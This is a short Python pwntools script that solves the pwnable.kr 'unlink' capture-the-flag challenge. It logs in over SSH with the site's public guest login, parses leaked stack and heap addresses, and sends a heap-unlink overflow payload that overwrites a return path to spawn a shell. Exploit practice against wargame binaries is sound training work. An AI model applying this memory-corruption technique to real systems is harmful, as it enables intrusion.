'''
    this challenge creates a mock unlinking like the unsorted bins do.
    
    simple challenge.
'''

from pwn import *

gs = '''

    break *0x080485ff
    continue

'''

elf = context.binary = ELF("unlink")

def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

s = ssh(host='pwnable.kr', port=2222, user='unlink', password='guest')

io = s.process(["./unlink"])
#io = start()

io.recvuntil(b": ")
stack = int(io.recvline(), 16)

io.recvuntil(b": ")
heap = int(io.recvline(),16)

print(f"Stack: {hex(stack)} | Heap: {hex(heap)}")

# =================================================

shell = 0x080484eb

# stack - 0x1c is ret addr of unlink() | heap + 0xc
payload = b"A"*16 + p32(heap + 0x28) + p32(stack + 0x10) + b"AAAA" + p32(shell)
io.sendline(payload)

io.interactive()
